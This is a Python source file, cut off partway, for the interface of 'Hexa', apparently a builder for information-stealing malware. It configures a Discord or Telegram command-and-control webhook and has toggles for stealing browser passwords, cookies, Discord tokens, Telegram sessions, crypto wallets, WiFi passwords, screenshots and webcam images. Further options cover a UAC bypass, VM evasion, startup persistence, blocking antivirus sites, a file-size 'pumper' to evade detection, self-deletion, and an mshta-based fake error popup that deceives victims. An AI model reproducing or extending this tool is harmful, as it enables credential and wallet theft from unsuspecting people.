import os
import subprocess
import sys
import json
import ctypes
import shutil
import ast
import webbrowser
import random
import string
import threading
import time
import urllib.parse
from urllib.request import Request, urlopen
from tkinter import messagebox, filedialog
from PIL import Image, ImageTk
import customtkinter as ctk

# Set appearance mode and default color theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# Constants
APPLICATION_NAME = "Hexa"
APPLICATION_VERSION = "1.0.0"
DEFAULT_ACCENT_COLOR = "#7B68EE"  # Hex-inspired purple accent
SECONDARY_COLOR = "#8A2BE2"
BACKGROUND_COLOR = "#1A1A2E"

class Settings:
    UpdatesCheck = True
    Password = "hexa123"  # Updated default password

class Utility:
    @staticmethod
    def ToggleConsole(choice: bool) -> None:
        """Toggle console window visibility"""
        if hasattr(ctypes.windll.kernel32, "GetConsoleWindow") and hasattr(ctypes.windll.user32, "ShowWindow"):
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            ctypes.windll.user32.ShowWindow(console_window, 4 if choice else 0)

    @staticmethod
    def IsAdmin() -> bool:
        """Check if the application is running with admin privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except Exception:
            return False
    
    @staticmethod
    def GetSelfDir() -> str:
        """Get the directory of the current file"""
        return os.path.dirname(os.path.realpath(__file__))
    
    @staticmethod
    def CheckInternetConnection() -> bool:
        """Check if the computer is connected to the internet"""
        try:
            request = Request("https://www.google.com", headers={'User-Agent': 'Mozilla/5.0'})
            urlopen(request, timeout=3)
            return True
        except:
            return False

    @staticmethod
    def CheckForUpdates() -> bool:
        """Check for application updates"""
        if not Settings.UpdatesCheck:
            return False
        
        if not Utility.CheckInternetConnection():
            return False
        
        # Update check logic would go here
        return False
    
    @staticmethod
    def CheckConfiguration() -> None:
        """Check if the configuration files exist and are valid"""
        configFile = os.path.join(os.path.dirname(__file__), "config.json")
        password = Settings.Password
        updatesCheck = Settings.UpdatesCheck

        if os.path.isfile(configFile):
            with open(configFile, "r") as file:
                config = json.load(file)
                password = config.get("Password", password)
                updatesCheck = config.get("Check for updates", updatesCheck)
        else:
            updatesCheck = not input("Do you want to regularly check for updates? [Y (default)/N]: ").lower().startswith("n")
            _password = input(f"Enter a new password for the archive (default: {Settings.Password}): ").strip()
            if _password:
                password = _password
            
        with open(configFile, "w") as file:
            json.dump({
                "Password": password,
                "Check for updates": updatesCheck
            }, file, indent=4, sort_keys=True)
        
        Settings.Password = password
        Settings.UpdatesCheck = updatesCheck

# Custom UI Elements
class HexaButton(ctk.CTkButton):
    """Custom button with hover effects and modern styling"""
    def __init__(self, master, **kwargs):
        self.hover_color = kwargs.pop("hover_color", SECONDARY_COLOR)
        self.original_color = kwargs.get("fg_color", DEFAULT_ACCENT_COLOR)
        
        super().__init__(
            master,
            corner_radius=8,
            border_width=0,
            hover=True,
            font=("Segoe UI", 11, "bold"),
            **kwargs
        )

class HexaSwitch(ctk.CTkSwitch):
    """Custom switch with enhanced styling"""
    def __init__(self, master, **kwargs):
        super().__init__(
            master,
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR,
            button_hover_color="#9370DB",
            **kwargs
        )

class HexaFrame(ctk.CTkFrame):
    """Custom frame with enhanced styling"""
    def __init__(self, master, **kwargs):
        super().__init__(
            master,
            corner_radius=10,
            border_width=1,
            border_color="#333333",
            **kwargs
        )

class PumperSettings(ctk.CTkToplevel):
    def __init__(self, master) -> None:
        super().__init__(master)
        self.title(f"{APPLICATION_NAME} - File Pumper")
        self.geometry("450x300")
        self.resizable(False, False)
        
        # Set icon
        try:
            self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        except:
            pass
        
        self.grab_set()
        self.limit = 0
        self.limitVar = ctk.StringVar(self, value="0")
        
        # Main frame
        self.main_frame = HexaFrame(self, fg_color="#1E1E2E")
        self.main_frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        # Title
        self.title_label = ctk.CTkLabel(
            self.main_frame,
            text="File Pumper",
            font=("Segoe UI", 18, "bold"),
            text_color="#FFFFFF"
        )
        self.title_label.pack(pady=(15, 20))
        
        # Description
        self.desc_label = ctk.CTkLabel(
            self.main_frame,
            text="Increase the file size to bypass size-based detection.\nSpecify the desired output file size in MB.",
            font=("Segoe UI", 12),
            text_color="#CCCCCC"
        )
        self.desc_label.pack(pady=(0, 20), padx=20)
        
        # Size entry frame
        self.size_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.size_frame.pack(fill="x", padx=20, pady=10)
        
        self.size_label = ctk.CTkLabel(
            self.size_frame,
            text="File Size (MB):",
            font=("Segoe UI", 12),
            width=100,
            anchor="w"
        )
        self.size_label.pack(side="left")
        
        self.size_entry = ctk.CTkEntry(
            self.size_frame,
            textvariable=self.limitVar,
            width=100,
            font=("Segoe UI", 12)
        )
        self.size_entry.pack(side="left", padx=10)
        self.size_entry.bind("<KeyRelease>", self.on_limit_change)
        
        # Buttons
        self.buttons_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.buttons_frame.pack(fill="x", padx=20, pady=(20, 10), side="bottom")
        
        self.cancel_button = HexaButton(
            self.buttons_frame,
            text="Cancel",
            command=self.destroy,
            width=100,
            height=32,
            fg_color="#444455"
        )
        self.cancel_button.pack(side="left", padx=(0, 10))
        
        self.ok_button = HexaButton(
            self.buttons_frame,
            text="Apply",
            command=self.ok_Event,
            width=100,
            height=32,
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.ok_button.pack(side="right")
        
        # Note
        self.note_label = ctk.CTkLabel(
            self.main_frame,
            text="Note: If the original file is already larger than the specified size,\nno additional padding will be added.",
            font=("Segoe UI", 11, "italic"),
            text_color="#999999"
        )
        self.note_label.pack(pady=(0, 10))

    def on_limit_change(self, _):
        limitBoxText = self.limitVar.get()
        if limitBoxText.isdigit():
            self.ok_button.configure(state="normal", fg_color=DEFAULT_ACCENT_COLOR)
        else:
            self.ok_button.configure(state="disabled", fg_color="#555555")
    
    def ok_Event(self) -> None:
        if self.limitVar.get().isdigit():
            self.limit = int(self.limitVar.get())
            self.destroy()
        else:
            messagebox.showerror("Error", "The size should be a positive number!")

class FakeErrorBuilder(ctk.CTkToplevel):
    def __init__(self, master) -> None:
        super().__init__(master)
        self.title(f"{APPLICATION_NAME} - Fake Error Builder")
        self.geometry("600x400")
        self.resizable(True, False)
        
        # Set icon
        try:
            self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        except:
            pass
        
        self.grab_set()
        self.master = master
        self.iconVar = ctk.IntVar(self, value=0)
        
        # Main frame
        self.main_frame = HexaFrame(self, fg_color="#1E1E2E")
        self.main_frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        # Title
        self.title_label = ctk.CTkLabel(
            self.main_frame,
            text="Create Fake Error Message",
            font=("Segoe UI", 18, "bold"),
            text_color="#FFFFFF"
        )
        self.title_label.pack(pady=(15, 20))
        
        # Error content frame
        self.content_frame = ctk.CTkFrame(self.main_frame, fg_color="#252538")
        self.content_frame.pack(fill="x", padx=20, pady=(0, 20))
        
        # Error title
        self.title_label = ctk.CTkLabel(
            self.content_frame,
            text="Error Title:",
            font=("Segoe UI", 12),
            anchor="w"
        )
        self.title_label.pack(anchor="w", padx=15, pady=(15, 5))
        
        self.titleEntry = ctk.CTkEntry(
            self.content_frame,
            placeholder_text="Enter error title here",
            height=35,
            font=("Segoe UI", 12)
        )
        self.titleEntry.pack(fill="x", padx=15, pady=(0, 15))
        
        # Error message
        self.message_label = ctk.CTkLabel(
            self.content_frame,
            text="Error Message:",
            font=("Segoe UI", 12),
            anchor="w"
        )
        self.message_label.pack(anchor="w", padx=15, pady=(0, 5))
        
        self.messageEntry = ctk.CTkEntry(
            self.content_frame,
            placeholder_text="Enter error message here",
            height=35,
            font=("Segoe UI", 12)
        )
        self.messageEntry.pack(fill="x", padx=15, pady=(0, 15))
        
        # Icon frame
        self.icon_frame = ctk.CTkFrame(self.main_frame, fg_color="#252538")
        self.icon_frame.pack(fill="x", padx=20, pady=(0, 20))
        
        self.icon_title = ctk.CTkLabel(
            self.icon_frame,
            text="Error Icon:",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        self.icon_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Radio buttons for icons
        self.icon_options_frame = ctk.CTkFrame(self.icon_frame, fg_color="transparent")
        self.icon_options_frame.pack(fill="x", padx=15, pady=(0, 15))
        self.icon_options_frame.columnconfigure(0, weight=1)
        self.icon_options_frame.columnconfigure(1, weight=1)
        
        self.iconChoiceSt = ctk.CTkRadioButton(
            self.icon_options_frame,
            text="Stop",
            value=0,
            variable=self.iconVar,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.iconChoiceSt.grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        self.iconChoiceQn = ctk.CTkRadioButton(
            self.icon_options_frame,
            text="Question",
            value=16,
            variable=self.iconVar,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.iconChoiceQn.grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        self.iconChoiceWa = ctk.CTkRadioButton(
            self.icon_options_frame,
            text="Warning",
            value=32,
            variable=self.iconVar,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.iconChoiceWa.grid(row=1, column=0, sticky="w", padx=5, pady=5)
        
        self.iconChoiceIn = ctk.CTkRadioButton(
            self.icon_options_frame,
            text="Information",
            value=48,
            variable=self.iconVar,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.iconChoiceIn.grid(row=1, column=1, sticky="w", padx=5, pady=5)
        
        # Buttons
        self.buttons_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.buttons_frame.pack(fill="x", padx=20, pady=(10, 15))
        
        self.cancel_button = HexaButton(
            self.buttons_frame,
            text="Cancel",
            command=self.destroy,
            width=100,
            height=32,
            fg_color="#444455"
        )
        self.cancel_button.pack(side="left")
        
        self.test_button = HexaButton(
            self.buttons_frame,
            text="Test",
            command=self.testFakeError,
            width=100,
            height=32,
            fg_color="#444455"
        )
        self.test_button.pack(side="left", padx=10)
        
        self.save_button = HexaButton(
            self.buttons_frame,
            text="Save",
            command=self.saveFakeError,
            width=100,
            height=32,
            fg_color=DEFAULT_ACCENT_COLOR
        )
        self.save_button.pack(side="right")
    
    def testFakeError(self) -> None:
        title = self.titleEntry.get()
        message = self.messageEntry.get()
        icon = self.iconVar.get()

        if title.strip() == "":
            title = "Title"
            self.titleEntry.insert(0, title)
        
        if message.strip() == "":
            message = "Message"
            self.messageEntry.insert(0, message)
        
        cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
        subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    def saveFakeError(self) -> None:
        title = self.titleEntry.get().replace("\"", "\\\"").replace("'", "\\'")
        message = self.messageEntry.get().replace("\"", "\\\"").replace("'", "\\'")
        icon = self.iconVar.get()

        if title.strip() == message.strip() == "":
            self.master.fakeErrorData = [False, ("", "", 0)]
            self.destroy()
        elif title.strip() == "":
            messagebox.showerror("Error", "Title cannot be empty")
            return
        elif message.strip() == "":
            messagebox.showerror("Error", "Message cannot be empty")
            return
        
        self.master.fakeErrorData = [True, (title, message, icon)]
        self.destroy()

class BuilderOptionsFrame(ctk.CTkFrame):
    def __init__(self, master) -> None:
        super().__init__(master, fg_color="transparent")

        self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
        self.pumpLimit = 0  # Bytes
        self.font = ctk.CTkFont(size=12)
        self.grid_propagate(False)

        # Variables
        self.pingMeVar = ctk.BooleanVar(self, value=True)
        self.vmProtectVar = ctk.BooleanVar(self, value=True)
        self.startupVar = ctk.BooleanVar(self, value=True)
        self.meltVar = ctk.BooleanVar(self, value=False)
        self.fakeErrorVar = ctk.BooleanVar(self, value=False)
        self.blockAvSitesVar = ctk.BooleanVar(self, value=True)
        self.discordInjectionVar = ctk.BooleanVar(self, value=True)
        self.uacBypassVar = ctk.BooleanVar(self, value=True)
        self.pumpStubVar = ctk.BooleanVar(self, value=False)

        self.captureWebcamVar = ctk.BooleanVar(self, value=False)
        self.capturePasswordsVar = ctk.BooleanVar(self, value=True)
        self.captureCookiesVar = ctk.BooleanVar(self, value=True)
        self.captureHistoryVar = ctk.BooleanVar(self, value=True)
        self.captureAutofillsVar = ctk.BooleanVar(self, value=True)
        self.captureDiscordTokensVar = ctk.BooleanVar(self, value=True)
        self.captureGamesVar = ctk.BooleanVar(self, value=True)
        self.captureWifiPasswordsVar = ctk.BooleanVar(self, value=True)
        self.captureSystemInfoVar = ctk.BooleanVar(self, value=True)
        self.captureScreenshotVar = ctk.BooleanVar(self, value=True)
        self.captureTelegramVar = ctk.BooleanVar(self, value=True)
        self.captureCommonFilesVar = ctk.BooleanVar(self, value=True)
        self.captureWalletsVar = ctk.BooleanVar(self, value=True)
        
        # State
        self.boundExePath = ""
        self.boundExeRunOnStartup = False
        self.iconBytes = ""
        self.OutputAsExe = True
        self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
        self.C2Mode = 0 # 0 = Discord, 1 = Telegram
        
        # Create the main interface
        self._create_main_interface()

    def _create_main_interface(self):
        # Configure grid
        for i in range(10):
            self.rowconfigure(i, weight=1)
        for i in range(6):
            self.columnconfigure(i, weight=1)

        # Create tabs for better organization
        self.tabview = ctk.CTkTabview(self, fg_color="#1A1A2E")
        self.tabview.grid(row=0, column=0, columnspan=6, rowspan=9, sticky="nsew", padx=15, pady=15)
        
        # Add tabs
        self.tabview.add("Main")
        self.tabview.add("Features")
        self.tabview.add("Advanced")
        self.tabview.add("Build")
        
        # Style tab buttons
        self.tabview._segmented_button.configure(font=("Segoe UI", 12, "bold"), fg_color="#252538", 
                                              selected_color=DEFAULT_ACCENT_COLOR, 
                                              selected_hover_color=SECONDARY_COLOR,
                                              unselected_color="#252538",
                                              unselected_hover_color="#353545")
        
        # Set up each tab
        self._setup_main_tab(self.tabview.tab("Main"))
        self._setup_features_tab(self.tabview.tab("Features"))
        self._setup_advanced_tab(self.tabview.tab("Advanced"))
        self._setup_build_tab(self.tabview.tab("Build"))
        
        # Build button at the bottom
        self.buildButtonControl = HexaButton(
            self, 
            text="BUILD", 
            height=50, 
            font=ctk.CTkFont(size=16, weight="bold"),
            fg_color=DEFAULT_ACCENT_COLOR,
            hover_color=SECONDARY_COLOR,
            command=self.buildButtonControl_Callback
        )
        self.buildButtonControl.grid(row=9, column=0, columnspan=6, sticky="ew", padx=15, pady=(0, 15))

    def _setup_main_tab(self, parent):
        # C2 Configuration Frame
        c2_frame = HexaFrame(parent, fg_color="#252538")
        c2_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        c2_title = ctk.CTkLabel(
            c2_frame,
            text="Command & Control Configuration",
            font=("Segoe UI", 16, "bold"),
            text_color="#FFFFFF"
        )
        c2_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # C2 Mode
        c2_mode_frame = ctk.CTkFrame(c2_frame, fg_color="transparent")
        c2_mode_frame.pack(fill="x", padx=15, pady=5)
        
        c2_mode_label = ctk.CTkLabel(
            c2_mode_frame,
            text="C2 Mode:",
            font=("Segoe UI", 12),
            width=100,
            anchor="w"
        )
        c2_mode_label.pack(side="left")
        
        # Radio buttons for C2 mode
        self.c2_mode_var = ctk.IntVar(value=0)
        
        c2_discord_rb = ctk.CTkRadioButton(
            c2_mode_frame,
            text="Discord",
            variable=self.c2_mode_var,
            value=0,
            command=self.C2ModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        c2_discord_rb.pack(side="left", padx=(0, 15))
        
        c2_telegram_rb = ctk.CTkRadioButton(
            c2_mode_frame,
            text="Telegram",
            variable=self.c2_mode_var,
            value=1,
            command=self.C2ModeButtonControl_Callback,
            font=("Segoe UI", 12),
            fg_color=DEFAULT_ACCENT_COLOR
        )
        c2_telegram_rb.pack(side="left")
        
        # C2 URL Entry
        c2_url_frame = ctk.CTkFrame(c2_frame, fg_color="transparent")
        c2_url_frame.pack(fill="x", padx=15, pady=(10, 5))
        
        self.c2_url_label = ctk.CTkLabel(
            c2_url_frame,
            text="Webhook URL:",
            font=("Segoe UI", 12),
            anchor="w"
        )
        self.c2_url_label.pack(anchor="w", pady=(0, 5))
        
        url_entry_frame = ctk.CTkFrame(c2_url_frame, fg_color="transparent")
        url_entry_frame.pack(fill="x")
        
        self.C2EntryControl = ctk.CTkEntry(
            url_entry_frame,
            placeholder_text="Enter Discord webhook URL here",
            height=38,
            font=("Segoe UI", 12),
            fg_color="#333344"
        )
        self.C2EntryControl.pack(side="left", fill="x", expand=True, padx=(0, 10))
        
        self.testC2ButtonControl = HexaButton(
            url_entry_frame,
            text="Test Connection",
            command=self.testC2ButtonControl_Callback,
            width=150,
            height=38,
            fg_color="#444455",
            hover_color="#555566"
        )
        self.testC2ButtonControl.pack(side="right")
        
        # Additional C2 Options
        options_frame = ctk.CTkFrame(c2_frame, fg_color="transparent")
        options_frame.pack(fill="x", padx=15, pady=(15, 5))
        
        self.pingMeCheckboxControl = ctk.CTkSwitch(
            options_frame,
            text="Ping on Success",
            variable=self.pingMeVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.pingMeCheckboxControl.pack(anchor="w", pady=5)
        
        self.discordInjectionCheckboxControl = ctk.CTkSwitch(
            options_frame,
            text="Discord Injection",
            variable=self.discordInjectionVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.discordInjectionCheckboxControl.pack(anchor="w", pady=5)

    def _setup_features_tab(self, parent):
        features_frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        features_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        features_title = ctk.CTkLabel(
            features_frame,
            text="Data Collection Features",
            font=("Segoe UI", 16, "bold"),
            text_color="#FFFFFF"
        )
        features_title.pack(anchor="w", pady=(0, 15))
        
        # Create category frames
        browser_frame = HexaFrame(features_frame, fg_color="#252538")
        browser_frame.pack(fill="x", pady=(0, 10))
        
        system_frame = HexaFrame(features_frame, fg_color="#252538")
        system_frame.pack(fill="x", pady=(0, 10))
        
        accounts_frame = HexaFrame(features_frame, fg_color="#252538")
        accounts_frame.pack(fill="x", pady=(0, 10))
        
        # Browser data collection
        browser_title = ctk.CTkLabel(
            browser_frame,
            text="Browser Data",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        browser_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Create two columns for better organization
        browser_columns = ctk.CTkFrame(browser_frame, fg_color="transparent")
        browser_columns.pack(fill="x", padx=15, pady=(0, 15))
        browser_columns.columnconfigure(0, weight=1)
        browser_columns.columnconfigure(1, weight=1)
        
        # Left column
        browser_left = ctk.CTkFrame(browser_columns, fg_color="transparent")
        browser_left.grid(row=0, column=0, sticky="w")
        
        self.capturePasswordsCheckboxControl = ctk.CTkSwitch(
            browser_left,
            text="Passwords",
            variable=self.capturePasswordsVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.capturePasswordsCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureCookiesCheckboxControl = ctk.CTkSwitch(
            browser_left,
            text="Cookies",
            variable=self.captureCookiesVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureCookiesCheckboxControl.pack(anchor="w", pady=5)
        
        # Right column
        browser_right = ctk.CTkFrame(browser_columns, fg_color="transparent")
        browser_right.grid(row=0, column=1, sticky="w")
        
        self.captureHistoryCheckboxControl = ctk.CTkSwitch(
            browser_right,
            text="History",
            variable=self.captureHistoryVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureHistoryCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureAutofillsCheckboxControl = ctk.CTkSwitch(
            browser_right,
            text="Autofills",
            variable=self.captureAutofillsVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureAutofillsCheckboxControl.pack(anchor="w", pady=5)
        
        # System information collection
        system_title = ctk.CTkLabel(
            system_frame,
            text="System Information",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        system_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Create two columns
        system_columns = ctk.CTkFrame(system_frame, fg_color="transparent")
        system_columns.pack(fill="x", padx=15, pady=(0, 15))
        system_columns.columnconfigure(0, weight=1)
        system_columns.columnconfigure(1, weight=1)
        
        # Left column
        system_left = ctk.CTkFrame(system_columns, fg_color="transparent")
        system_left.grid(row=0, column=0, sticky="w")
        
        self.captureSystemInfoCheckboxControl = ctk.CTkSwitch(
            system_left,
            text="System Info",
            variable=self.captureSystemInfoVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureSystemInfoCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureScreenshotCheckboxControl = ctk.CTkSwitch(
            system_left,
            text="Screenshot",
            variable=self.captureScreenshotVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureScreenshotCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureWebcamCheckboxControl = ctk.CTkSwitch(
            system_left,
            text="Webcam",
            variable=self.captureWebcamVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureWebcamCheckboxControl.pack(anchor="w", pady=5)
        
        # Right column
        system_right = ctk.CTkFrame(system_columns, fg_color="transparent")
        system_right.grid(row=0, column=1, sticky="w")
        
        self.captureWifiPasswordsCheckboxControl = ctk.CTkSwitch(
            system_right,
            text="WiFi Passwords",
            variable=self.captureWifiPasswordsVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureWifiPasswordsCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureCommonFilesCheckboxControl = ctk.CTkSwitch(
            system_right,
            text="Common Files",
            variable=self.captureCommonFilesVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureCommonFilesCheckboxControl.pack(anchor="w", pady=5)
        
        # Accounts and services collection
        accounts_title = ctk.CTkLabel(
            accounts_frame,
            text="Accounts & Services",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        accounts_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Create two columns
        accounts_columns = ctk.CTkFrame(accounts_frame, fg_color="transparent")
        accounts_columns.pack(fill="x", padx=15, pady=(0, 15))
        accounts_columns.columnconfigure(0, weight=1)
        accounts_columns.columnconfigure(1, weight=1)
        
        # Left column
        accounts_left = ctk.CTkFrame(accounts_columns, fg_color="transparent")
        accounts_left.grid(row=0, column=0, sticky="w")
        
        self.captureDiscordTokensCheckboxControl = ctk.CTkSwitch(
            accounts_left,
            text="Discord Tokens",
            variable=self.captureDiscordTokensVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureDiscordTokensCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureTelegramCheckboxControl = ctk.CTkSwitch(
            accounts_left,
            text="Telegram Sessions",
            variable=self.captureTelegramVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureTelegramCheckboxControl.pack(anchor="w", pady=5)
        
        # Right column
        accounts_right = ctk.CTkFrame(accounts_columns, fg_color="transparent")
        accounts_right.grid(row=0, column=1, sticky="w")
        
        self.captureWalletsCheckboxControl = ctk.CTkSwitch(
            accounts_right,
            text="Crypto Wallets",
            variable=self.captureWalletsVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureWalletsCheckboxControl.pack(anchor="w", pady=5)
        
        self.captureGamesCheckboxControl = ctk.CTkSwitch(
            accounts_right,
            text="Game Sessions",
            variable=self.captureGamesVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.captureGamesCheckboxControl.pack(anchor="w", pady=5)

    def _setup_advanced_tab(self, parent):
        advanced_frame = ctk.CTkFrame(parent, fg_color="transparent")
        advanced_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Protection features
        protection_frame = HexaFrame(advanced_frame, fg_color="#252538")
        protection_frame.pack(fill="x", pady=(0, 10))
        
        protection_title = ctk.CTkLabel(
            protection_frame,
            text="Protection & Persistence",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        protection_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        # Create two columns
        protection_columns = ctk.CTkFrame(protection_frame, fg_color="transparent")
        protection_columns.pack(fill="x", padx=15, pady=(0, 15))
        protection_columns.columnconfigure(0, weight=1)
        protection_columns.columnconfigure(1, weight=1)
        
        # Left column
        protection_left = ctk.CTkFrame(protection_columns, fg_color="transparent")
        protection_left.grid(row=0, column=0, sticky="w")
        
        self.vmProtectCheckboxControl = ctk.CTkSwitch(
            protection_left,
            text="VM Protection",
            variable=self.vmProtectVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.vmProtectCheckboxControl.pack(anchor="w", pady=5)
        
        self.uacBypassCheckboxControl = ctk.CTkSwitch(
            protection_left,
            text="UAC Bypass",
            variable=self.uacBypassVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.uacBypassCheckboxControl.pack(anchor="w", pady=5)
        
        # Right column
        protection_right = ctk.CTkFrame(protection_columns, fg_color="transparent")
        protection_right.grid(row=0, column=1, sticky="w")
        
        self.startupCheckboxControl = ctk.CTkSwitch(
            protection_right,
            text="Add to Startup",
            variable=self.startupVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.startupCheckboxControl.pack(anchor="w", pady=5)
        
        self.blockAvSitesCheckboxControl = ctk.CTkSwitch(
            protection_right,
            text="Block AV Sites",
            variable=self.blockAvSitesVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.blockAvSitesCheckboxControl.pack(anchor="w", pady=5)
        
        # Special features
        special_frame = HexaFrame(advanced_frame, fg_color="#252538")
        special_frame.pack(fill="x", pady=(0, 10))
        
        special_title = ctk.CTkLabel(
            special_frame,
            text="Special Features",
            font=("Segoe UI", 14, "bold"),
            text_color=DEFAULT_ACCENT_COLOR
        )
        special_title.pack(anchor="w", padx=15, pady=(15, 10))
        
        special_options = ctk.CTkFrame(special_frame, fg_color="transparent")
        special_options.pack(fill="x", padx=15, pady=(0, 15))
        
        # Fake Error
        fake_error_row = ctk.CTkFrame(special_options, fg_color="transparent")
        fake_error_row.pack(fill="x", pady=5)
        
        self.fakeErrorCheckboxControl = ctk.CTkSwitch(
            fake_error_row,
            text="Fake Error Message",
            variable=self.fakeErrorVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR,
            command=self.fakeError_Event
        )
        self.fakeErrorCheckboxControl.pack(side="left")
        
        self.fakeErrorConfigButton = HexaButton(
            fake_error_row,
            text="Configure",
            command=self.fakeError_Event,
            width=100,
            height=30,
            fg_color="#444455"
        )
        self.fakeErrorConfigButton.pack(side="right")
        
        # Stub Pumper
        pump_stub_row = ctk.CTkFrame(special_options, fg_color="transparent")
        pump_stub_row.pack(fill="x", pady=5)
        
        self.pumpStubCheckboxControl = ctk.CTkSwitch(
            pump_stub_row,
            text="Pump File Size",
            variable=self.pumpStubVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR,
            command=self.pumpStub_Event
        )
        self.pumpStubCheckboxControl.pack(side="left")
        
        self.pumpStubConfigButton = HexaButton(
            pump_stub_row,
            text="Configure",
            command=self.pumpStub_Event,
            width=100,
            height=30,
            fg_color="#444455"
        )
        self.pumpStubConfigButton.pack(side="right")
        
        # Self-destruction
        self.meltCheckboxControl = ctk.CTkSwitch(
            special_options,
            text="Self Destruct After Execution",
            variable=self.meltVar,
            font=("Segoe UI", 12),
            progress_color=DEFAULT_ACCENT_COLOR,
            button_color=SECONDARY_COLOR
        )
        self.meltCheckboxControl.pack(anchor="w", pady=5)

    def _setup_build_tab(self, parent):
        build_frame = ctk.CTkFrame(parent, fg_color="transparent")
        build_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Output settings
        output_frame = HexaFrame(build_frame, fg_color="#252538")
        output_frame.pack(fill="x", pady=(0, 10))
        
        output_title = ctk.CTkLabel(
            output_frame,
            text="Output Settings",
            font=("Segoe UI", 14, "bold"),
